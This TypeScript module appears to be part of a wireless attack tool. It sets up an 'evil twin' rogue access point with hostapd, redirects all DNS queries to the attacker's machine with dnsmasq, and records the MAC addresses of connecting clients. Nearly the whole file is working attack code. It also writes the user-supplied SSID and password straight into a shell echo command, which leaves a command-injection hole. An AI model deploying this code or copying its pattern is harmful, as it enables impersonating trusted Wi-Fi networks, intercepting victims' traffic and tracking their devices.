import { EventEmitter } from 'events';
import { spawn, ChildProcess } from 'child_process';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export const etEmitter = new EventEmitter();
etEmitter.setMaxListeners(100);

export const visitLog: any[] = [];

let active = false;
let session: any = null;
let hostapd: ChildProcess | null = null;
let dnsmasq: ChildProcess | null = null;
let autoModeConfig = { enabled: false, ssid: '', password: '' };

function emit(event: string, data: any = {}) {
  const payload = { event, ...data };
  etEmitter.emit('any', payload);
}

export function isEvilTwinActive() { return active; }
export function getEvilTwinSession() { return session; }
export function setAutoMode(enabled: boolean, ssid: string, password: string) {
  autoModeConfig = { enabled, ssid, password };
}
export function getAutoMode() { return autoModeConfig; }

export async function startEvilTwin(ssid: string, password: string): Promise<void> {
  if (active) return;

  // Write hostapd config
  const hostapdConf = [
    'interface=wlan0',
    'driver=nl80211',
    `ssid=${ssid}`,
    'hw_mode=g',
    'channel=6',
    'macaddr_acl=0',
    'auth_algs=1',
    ...(password ? [`wpa=2`, `wpa_passphrase=${password}`, `wpa_key_mgmt=WPA-PSK`] : []),
  ].join('\n');

  try {
    await execAsync(`echo '${hostapdConf}' > /tmp/apex-hostapd.conf`);
    hostapd = spawn('hostapd', ['/tmp/apex-hostapd.conf']);
    hostapd.stdout?.on('data', (d: Buffer) => {
      const msg = d.toString();
      const macMatch = msg.match(/([0-9a-f:]{17})/i);
      if (msg.includes('AP-STA-CONNECTED') && macMatch) {
        const mac = macMatch[1];
        emit('client_connected', { mac, ssid });
        visitLog.push({ event: 'connect', mac, ssid, ts: new Date().toISOString() });
      }
    });
    hostapd.on('exit', () => { active = false; emit('hostapd_stopped'); });

    dnsmasq = spawn('dnsmasq', ['--no-daemon', '--interface=wlan0', '--dhcp-range=10.0.0.10,10.0.0.50,1h', '--dhcp-option=3,10.0.0.1', '--address=/#/10.0.0.1']);

    active = true;
    session = { ssid, hasPassword: !!password, startedAt: new Date().toISOString(), clients: [] };
    emit('evil_twin_started', session);
  } catch (err) {
    active = false;
    throw err;
  }
}

export async function stopEvilTwin(permanent = true): Promise<any> {
  const ended = { ...session, endedAt: new Date().toISOString() };
  active = false;
  session = null;
  hostapd?.kill('SIGTERM');
  dnsmasq?.kill('SIGTERM');
  hostapd = null;
  dnsmasq = null;
  if (permanent) autoModeConfig.enabled = false;
  emit('evil_twin_stopped', ended);
  return ended;
}
